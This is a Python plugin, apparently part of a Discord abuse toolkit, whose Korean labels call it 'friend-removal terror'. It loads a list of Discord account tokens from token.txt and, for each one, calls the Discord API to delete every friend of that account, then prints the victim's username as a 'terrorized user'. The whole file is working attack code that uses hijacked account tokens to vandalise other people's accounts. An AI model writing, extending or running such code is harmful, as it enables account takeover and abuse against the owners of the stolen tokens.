import asyncio
import colorama
import importlib

import aiohttp
from colorama import Fore

from utils.Plugin.PluginABC import PluginABC
from utils.Setting.setup_most import heads

colorama.init(autoreset=True)


class AccountBomber(PluginABC):
    plugin_name = "친삭 테러"
    
    @classmethod
    async def remove_friend(cls, token: str):
        base_url = "https://discord.com/api/v10/users/@me"
        relationship_url = f"{base_url}/relationships"

        async with (
            aiohttp.ClientSession() as session,
            session.get(base_url, headers=heads(token=token)) as user_response,
            session.get(relationship_url, headers=heads(token=token)) as response,
        ):
            user_info = await user_response.json()
            friend_infos = await response.json()

            for friend_info in friend_infos:
                url = f"{relationship_url}/{friend_info['id']}"
                async with session.delete(url=url, headers=heads(token=token)):
                    pass

        print(
            f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] 테러한 사용자 이름: {Fore.WHITE}{user_info['username']}#{user_info['discriminator']}{Fore.RESET}")
            
    @classmethod
    async def accounts_bomber(cls):
        tokens: list[str] = []
        with open("token.txt", "r", encoding="utf-8") as f:
            for line in f.readlines():
                # 주석 처리된 문장 무시
                if line.startswith("#"):
                    continue
                tokens.append(line)

        await asyncio.gather(*[cls.remove_friend(token=token) for token in tokens])
        
    @classmethod
    async def main(cls):
        option = super().get_option()
        
        if option == 1:
            print(f"[\x1b[95m>\x1b[95m\x1B[37m] token.txt에 있는 토큰을 조회하고 해당 토큰의 친구들을 삭제하는 중입니다.\n")
            await cls.accounts_bomber()
            
            input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] 엔터를 눌러주세요: ')
            await importlib.import_module("main").Hydron()
        else:
            await importlib.import_module("main").Hydron()